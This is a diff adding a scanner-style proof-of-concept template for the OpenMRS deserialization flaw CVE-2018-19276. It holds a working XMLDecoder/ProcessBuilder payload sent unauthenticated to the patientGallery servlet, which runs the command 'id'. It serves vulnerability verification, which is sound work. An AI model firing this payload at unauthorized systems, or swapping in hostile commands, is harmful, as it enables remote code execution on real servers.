@@ -1,0 +1,35 @@
+[info]
+author = "ave"
+description = "验证 OpenMRS 平台是否存在不安全的对象反序列化漏洞。该漏洞位于 /module/webservices/extension/patientGallery.servlet 端点，未经认证的攻击者可发送包含恶意 Java 序列化对象的 XML 请求体，触发远程代码执行。"
+id = "POC-AVE-2018-0143"
+name = "OpenMRS Platform Insecure Object Deserialization PoC"
+severity = "critical"
+tags = ["ave-2018-0143"]
+vuln_id = [
+    "CVE-2018-19276",
+    "AVE-2018-0143",
+]
+
+[poc]
+logic = "all"
+
+[[poc.requests]]
+method = "POST"
+path = "/openmrs/module/webservices/extension/patientGallery.servlet"
+protocol = "http"
+
+[poc.requests.body]
+content = '<?xml version="1.0"?><java version="1.8.0_131" class="java.beans.XMLDecoder"><void class="java.lang.ProcessBuilder"><array class="java.lang.String" length="2"><void index="0"><string>id</string></void><void index="1"><string>-c</string></void></array><void method="start"/></void></java>'
+type = "raw"
+
+[poc.requests.headers]
+Content-Type = "application/xml"
+User-Agent = "AVE/1.0"
+
+[[poc.requests.matchers]]
+expect = false
+status = [
+    200,
+    500,
+]
+type = "status"
